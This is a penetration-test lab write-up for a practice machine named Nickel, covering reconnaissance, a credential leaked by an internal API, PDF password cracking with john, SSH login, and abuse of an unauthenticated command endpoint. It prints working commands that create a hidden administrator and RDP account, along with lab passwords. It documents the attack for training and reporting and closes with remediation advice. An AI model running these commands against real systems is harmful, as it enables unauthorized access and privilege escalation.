# Report - Nickel
Author: Henry Post
Target: NICKEL
Target IP: 192.168.61.99
Date: 03/24/2026

## Executive Summary

This machine, Nickel, was enumerated by `nmap` to have FTP, HTTP, and SSH open.

Port `8089` was running an HTTP server, which leaked a command line process that contained a user credential, `ariah`. 

This `ariah` account was used to login via SSH.

From there, we found an endpoint at `127.0.0.0.1?cmd` that allowed us to execute commands under `SYSTEM` authority.

This was used to create a privileged account and get `SYSTEM` level access over RDP.

### Recommendations

Protect command line processes and do not disclose this over HTTP.

Disable command execution endpoints like those running on `NICKEL` as it enables command injection.

Do not use passwords for SSH, but use public-private keypairs.

Do not run services as `SYSTEM` level, but a lower privileged account.

## Recon

We run `nmap -sS -sV NICKEL`.

![](Pasted%20image%2020260324124302.png)

I notice ports 21 (ftp), and port 8089 (http) and port 22 (ssh) are open.

![](Pasted%20image%2020260324131804.png)

Visiting `nickel:8089/` in Firefox shows us a few internal APIs.

I sent POST to each endpoint, replacing `169.254.85.99` with Nickel's IP/hostname.

```
curl -X POST http://nickel:33333/list-current-deployments -d "{}"
curl -X POST http://nickel:33333/list-active-nodes -d "{}"
curl -X POST http://nickel:33333/list-running-procs -d "{}"
```

![](Pasted%20image%2020260324131945.png)

Looks like `list-running-procs` gives us a dump.

```

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

```

We found base64-encoded password for `ariah` user.

![](Pasted%20image%2020260324132029.png)

Decoding it, we get `NowiseSloopTheory139` for a credential of:

```
ariah
NowiseSloopTheory139
```

We try FTP with that username and password combination.

```
ftp ariah@NICKEL
```

![](Pasted%20image%2020260324132132.png)

We find an encrypted PDF file. We crack it.

```sh
pdf2john Infrastructure.pdf > Infrastructure.hash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john Infrastructure.hash --wordlist=/usr/share/wordlists/rockyou.txt
# password: ariah4168
```

![](Pasted%20image%2020260324133919.png)

The PDF just has this hint:

```
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files
```

"Temporary Command Endpoint". We will revisit this later.

## Non-SYSTEM access

We `ssh` with this command:

```
ssh ariah@NICKEL
NowiseSloopTheory139
```

We steal the local flag.

![](Pasted%20image%2020260324134239.png)
## SYSTEM access

For SYSTEM access, we need to exploit the earlier hint:

```
Temporary Command endpoint: http://nickel/?
```

In our existing ssh shell, we test it.

```
curl http://localhost?whoami
```

![](Pasted%20image%2020260324134339.png)

Great. 

We use these commands, url-encoded, to create a user who we can RDP as.

```sh
#To create a user named api with a password of Dork123!  
net user api Dork123! /add  
  
#To add to the administrator and RDP groups  
net localgroup Administrators api /add  
net localgroup 'Remote Desktop Users' api /add

net%20user%20api%20Dork123!%20%2Fadd  
  
net%20localgroup%20Administrators%20api%20%2Fadd  
  
net%20localgroup%20%27Remote%20Desktop%20Users%27%20api%20%2Fadd

curl http://127.0.0.1/?net%20user%20api%20Dork123!%20%2Fadd

curl http://127.0.0.1/?net%20localgroup%20Administrators%20api%20%2Fadd

curl http://127.0.0.1/?net%20localgroup%20%27Remote%20Desktop%20Users%27%20api%20%2Fadd

```

![](Pasted%20image%2020260324134431.png)

Next, we RDP as that user from the attacker machine.

```
xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'api' /p:'Dork123!' /v:NICKEL
```

We get an RDP session.

![](Pasted%20image%2020260324134541.png)

We give ourselves r/w permissions to `C:\Users\Administrator\`.

![](Pasted%20image%2020260324134622.png)

We steal the SYSTEM flag.

![](Pasted%20image%2020260324134703.png)